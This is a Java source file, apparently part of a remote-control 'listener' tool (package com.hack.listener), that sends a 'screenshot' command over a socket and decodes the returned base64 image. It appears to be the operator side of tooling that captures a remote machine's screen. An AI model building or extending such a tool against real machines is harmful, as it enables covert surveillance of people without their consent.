package com.hack.listener;

import java.awt.Image;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.net.Socket;
import javax.imageio.ImageIO;

public class Screenshot {
    
    private final Socket socket;
    private CommandSend send;
    
    public Screenshot(Socket socket) {
        this.socket = socket;
    }
    
    public Image screenshot() throws IOException{
        send = new CommandSend(socket, "screenshot");
        String data = send.commandExecution().toString().replaceAll("\"", "");
        
        byte[] imageData = java.util.Base64.getDecoder().decode(data.getBytes("UTF-8"));

        // Bayt dizisinden bir BufferedImage oluşturun
        ByteArrayInputStream bis = new ByteArrayInputStream(imageData);
        BufferedImage bufferedImage = ImageIO.read(bis);

        // BufferedImage'den Image'e dönüştürün (isteğe bağlı)
        Image image = (Image) bufferedImage;
        return image;
    }
    
}
